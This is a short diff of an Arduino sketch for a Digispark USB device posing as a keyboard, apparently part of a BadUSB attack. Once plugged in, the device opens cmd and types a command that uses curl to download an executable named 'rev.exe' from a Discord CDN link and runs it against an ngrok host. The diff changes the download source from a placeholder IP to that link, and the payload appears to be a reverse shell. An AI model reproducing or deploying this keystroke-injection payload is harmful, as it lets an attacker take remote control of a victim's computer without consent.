@@ -13,7 +13,7 @@ void loop() {
   DigiKeyboard.print("cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("curl -o %TEMP%/reverse.exe http://000.000.0.000/reverse.exe | cmd /C %TEMP%\reverse.exe 9023-2804-1b94-6bc-c000-83ec-fc77-ba8f-55db.ngrok-free.app");
+  DigiKeyboard.print("curl -o %TEMP%/rev.exe https://cdn.discordapp.com/attachments/1095515004599537775/1147626697613643879/rev.exe | cmd /C %TEMP%\rev.exe 9023-2804-1b94-6bc-c000-83ec-fc77-ba8f-55db.ngrok-free.app");
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   digitalWrite(1, HIGH);
